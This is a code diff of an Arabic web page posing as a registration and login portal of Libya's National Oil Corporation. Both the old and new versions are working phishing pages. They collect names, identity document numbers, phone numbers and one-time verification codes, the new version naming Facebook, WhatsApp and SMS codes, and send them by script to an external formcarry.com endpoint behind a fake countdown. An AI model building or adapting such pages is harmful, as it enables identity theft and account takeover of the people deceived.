@@ -1,230 +1,267 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>مؤسسة النفط الليبية - التسجيل</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>المؤسسة الوطنــية</title>
+  <link rel="icon" href="uy.jpeg" type="image/png">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
-    * {
-      box-sizing: border-box;
-    }
     body {
       font-family: 'Cairo', sans-serif;
+      background: linear-gradient(135deg, #002147, #003366);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
       margin: 0;
-      padding: 0;
-      background-color: #f0f0f0;
-      color: #222;
-    }
-
-    .header {
-      background-color: #002b5c;
-      color: white;
-      padding: 15px;
-      text-align: center;
-      position: relative;
-    }
-
-    .header img {
-      width: 50px;
-      position: absolute;
-      top: 10px;
-      right: 10px;
+      direction: rtl;
     }
 
     .container {
-      max-width: 95%;
-      margin: 20px auto;
-      padding: 20px;
-      background: white;
-      border-radius: 15px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      background: #fff;
+      border-radius: 20px;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
+      padding: 35px 40px;
+      width: 96%;
+      max-width: 420px;
+      box-sizing: border-box;
+      text-align: center;
     }
 
-    h2 {
+    .logo-container {
       text-align: center;
-      color: #002b5c;
       margin-bottom: 20px;
     }
 
-    label {
-      font-weight: bold;
-      margin-top: 10px;
+    .logo-container img {
+      width: 90px;
+      height: 90px;
+      object-fit: contain;
+      margin: 0 auto;
       display: block;
     }
 
-    input, select {
-      width: 100%;
-      padding: 12px;
-      margin-top: 5px;
-      border: 1px solid #ccc;
-      border-radius: 10px;
+    .logo-container p {
+      margin-top: 8px;
+      font-weight: 700;
+      color: #003366;
       font-size: 16px;
     }
 
-    button {
+    h2 {
+      margin-bottom: 25px;
+      color: #003366;
+      font-weight: 900;
+      font-family: Arial, Helvetica, sans-serif;
+      font-size: 32px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 600;
+      color: #222;
+      text-align: right;
+    }
+
+    input[type="tel"],
+    input[type="text"] {
       width: 100%;
-      background-color: #002b5c;
-      color: white;
-      border: none;
-      padding: 14px;
-      margin-top: 20px;
+      padding: 12px 15px;
+      font-size: 16px;
       border-radius: 10px;
-      font-size: 18px;
+      border: 1.8px solid #bbb;
+      margin-bottom: 18px;
+      transition: border-color 0.3s ease;
+      box-sizing: border-box;
+      font-family: inherit;
+    }
+
+    input:focus {
+      border-color: gold;
+      outline: none;
+    }
+
+    input:disabled {
+      background-color: #f2f2f2;
+    }
+
+    button {
+      width: 40%;
+      padding: 12px;
+      font-size: 17px;
+      background-color: gold;
+      border: none;
+      border-radius: 10px;
+      color: #002147;
       cursor: pointer;
+      font-weight: bold;
+      font-family: Calibri, sans-serif;
+      transition: background-color 0.3s ease;
+      margin-bottom: 15px;
     }
 
-    button:hover {
-      background-color: #004080;
+    button:hover:not(:disabled) {
+      background-color: #e6c200;
     }
 
-    .popup {
-      position: fixed;
-      bottom: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: white;
-      border: 2px solid #002b5c;
-      padding: 15px;
-      border-radius: 15px;
-      width: 90%;
-      max-width: 350px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+    button:disabled {
+      background-color: #c2a300;
+      cursor: not-allowed;
     }
 
-    .hidden {
+    #timer {
+      text-align: center;
+      font-weight: 600;
+      color: black;
+      margin-bottom: 20px;
+      min-height: 24px;
+    }
+
+    #codeField {
       display: none;
     }
 
-    .timer {
-      text-align: center;
-      margin-top: 10px;
+    .error {
       color: red;
-      font-weight: bold;
-      font-size: 18px;
+      font-size: 14px;
+      margin-top: -10px;
+      margin-bottom: 15px;
     }
   </style>
 </head>
 <body>
 
-  <div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/ar/thumb/9/9f/NOC_Libya_logo.svg/200px-NOC_Libya_logo.svg.png" alt="شعار المؤسسة الوطنية للنفط">
-    <h1>المؤسسة الوطنية للنفط</h1>
-  </div>
-
   <div class="container">
-    <h2>نموذج التسجيل</h2>
-    <form id="mainForm">
-      <label for="fullname">الاسم الكامل:</label>
-      <input type="text" id="fullname" placeholder="مثال: عبدالسلام محمد التومي" required />
+    <div class="logo-container">
+      <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
+      <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
+    </div>
 
-      <label for="docType">نوع الوثيقة:</label>
-      <select id="docType" required>
-        <option value="">-- اختر نوع الوثيقة --</option>
-        <option value="بطاقة">بطاقة</option>
-        <option value="جواز سفر">جواز سفر</option>
-      </select>
+    <h2>تسجيل الدخول</h2>
 
-      <label for="docNumber">رقم الوثيقة:</label>
-      <input type="text" id="docNumber" placeholder="أدخل رقم الوثيقة" required />
-
+    <form id="phoneForm" onsubmit="return sendPhone(event);">
       <label for="phone">رقم الهاتف:</label>
-      <input type="text" id="phone" placeholder="مثال: 092xxxxxxx" required />
+      <input type="tel" id="phone" name="phone" required placeholder="أدخل رقم هاتفك الليبي" pattern="^09[1-5][0-9]{7}$" title="يجب أن يبدأ الرقم بـ 091 أو 092 أو 093 أو 094 أو 095 ويكون 10 أرقام" autocomplete="tel" />
+      <button type="submit" id="sendPhoneBtn">أرسل كود</button>
+      <div id="timer"></div>
+    </form>
 
-      <label for="address">العنوان:</label>
-      <input type="text" id="address" placeholder="مثال: بنغازي - شارع الاستقلال" required />
-
-      <button type="submit">أكمل الطلب</button>
+    <form id="codeForm" onsubmit="return sendCode(event);">
+      <div id="codeField">
+        <label for="code">📩 انتظر وصول كود التأكيد عبر إشعار من فيسبوك أو واتساب أو رسالة SMS</label>
+        <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" required />
+        <div id="errorMessage" class="error"></div>
+        <button type="submit" id="sendCodeBtn">طلب الدخول</button>
+      </div>
     </form>
   </div>
 
-  <div id="popup" class="popup hidden">
-    <label for="code">كود التوثيق (SMS):</label>
-    <input type="text" id="code" placeholder="أدخل الكود هنا" />
-    <button id="confirmBtn">تأكيد الكود</button>
-    <div class="timer" id="timer">08:00</div>
-  </div>
-
   <script>
-    const form = document.getElementById("mainForm");
-    const popup = document.getElementById("popup");
-    const timerEl = document.getElementById("timer");
-    const confirmBtn = document.getElementById("confirmBtn");
-    let confirmClicks = 0;
-
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
-
-      const fullname = document.getElementById("fullname").value.trim();
-      const docType = document.getElementById("docType").value;
-      const docNumber = document.getElementById("docNumber").value.trim();
-      const phone = document.getElementById("phone").value.trim();
-      const address = document.getElementById("address").value.trim();
-
-      const arabicRegex = /^[\u0600-\u06FF\s]{8,}$/;
-      const phoneRegex = /^(091|092|094|095|096|097|098)\d{6,}$/;
-
-      if (!arabicRegex.test(fullname)) {
-        alert("الاسم يجب أن يحتوي على 8 أحرف عربية أو أكثر.");
-        return;
-      }
-
-      if (!phoneRegex.test(phone)) {
-        alert("رقم الهاتف يجب أن يبدأ بـ 091 أو 092 أو 094 ...");
-        return;
-      }
-
-      await fetch("https://formcarry.com/s/a-Yw-WFDEqO", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          fullname,
-          docType,
-          docNumber,
-          phone,
-          address
-        })
-      });
-
-      popup.classList.remove("hidden");
-      startTimer(8 * 60);
-    });
-
-    confirmBtn.addEventListener("click", () => {
-      confirmClicks++;
-      if (confirmClicks < 2) {
-        alert("اضغط مرة أخرى لتأكيد الكود.");
-        return;
-      }
-
-      const code = document.getElementById("code").value.trim();
-      if (!/^[a-zA-Z0-9]{6,8}$/.test(code)) {
-        alert("الكود يجب أن يكون من 6 إلى 8 أحرف أو أرقام.");
-        confirmClicks = 0;
-        return;
-      }
-
-      fetch("https://formcarry.com/s/a-Yw-WFDEqO", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ verificationCode: code })
-      });
-
-      alert("تم إرسال كود التوثيق بنجاح.");
-    });
+    let countdownInterval;
+    const sendPhoneBtn = document.getElementById('sendPhoneBtn');
+    const timerDisplay = document.getElementById('timer');
+    const codeField = document.getElementById('codeField');
+    const phoneInput = document.getElementById('phone');
+    const codeInput = document.getElementById('code');
+    const errorMessage = document.getElementById('errorMessage');
 
     function startTimer(duration) {
-      let time = duration;
-      const interval = setInterval(() => {
-        const minutes = String(Math.floor(time / 60)).padStart(2, '0');
-        const seconds = String(time % 60).padStart(2, '0');
-        timerEl.textContent = `${minutes}:${seconds}`;
-        time--;
-
-        if (time < 0) {
-          clearInterval(interval);
-          timerEl.textContent = "انتهى الوقت!";
+      let timeLeft = duration;
+      timerDisplay.style.display = 'block';
+      updateTimer(timeLeft);
+      countdownInterval = setInterval(() => {
+        timeLeft--;
+        updateTimer(timeLeft);
+        if (timeLeft <= 0) {
+          clearInterval(countdownInterval);
+          timerDisplay.style.display = 'none';
+          sendPhoneBtn.disabled = false;
+          phoneInput.disabled = false;
         }
       }, 1000);
+    }
+
+    function updateTimer(seconds) {
+      const minutes = Math.floor(seconds / 60).toString().padStart(2, '0');
+      const secs = (seconds % 60).toString().padStart(2, '0');
+      timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${secs}`;
+    }
+
+    function sendPhone(event) {
+      event.preventDefault();
+      const phonePattern = /^09[1-5][0-9]{7}$/;
+      const phoneVal = phoneInput.value.trim();
+
+      if (!phonePattern.test(phoneVal)) {
+        alert('❌ رقم الهاتف غير صحيح. يجب أن يبدأ بـ 091 أو 092 أو 093 أو 094 أو 095 ويكون مكونًا من 10 أرقام.');
+        phoneInput.focus();
+        return false;
+      }
+
+      fetch('https://formcarry.com/s/a-Yw-WFDEqO', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify({ phone: phoneVal })
+      })
+      .then(response => {
+        if (!response.ok) throw new Error('فشل إرسال رقم الهاتف');
+
+        phoneInput.disabled = true;
+        sendPhoneBtn.disabled = true;
+        codeField.style.display = 'block';
+        startTimer(480); // 8 دقائق = 480 ثانية
+      })
+      .catch(error => {
+        alert('⚠️ تعذر إرسال رقم الهاتف. حاول مرة أخرى.');
+        console.error(error);
+      });
+
+      return false;
+    }
+
+    function sendCode(event) {
+      event.preventDefault();
+      errorMessage.textContent = '';
+
+      if (codeInput.value.trim() === '') {
+        errorMessage.textContent = 'يرجى كتابة الكود المرسل إليك.';
+        codeInput.focus();
+        return false;
+      }
+
+      const payload = {
+        phone: phoneInput.value,
+        code: codeInput.value
+      };
+
+      fetch('https://formcarry.com/s/a-Yw-WFDEqO', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(async response => {
+        const data = await response.json();
+
+        if (response.ok && data.success !== false) {
+          window.location.href = 'success.html';
+        } else {
+          errorMessage.textContent = '❌ الكود غير صحيح. حاول مرة أخرى.';
+        }
+      })
+      .catch(error => {
+        errorMessage.textContent = '⚠️ تعذر الاتصال بالخادم.';
+        console.error(error);
+      });
+
+      return false;
     }
   </script>
 </body>
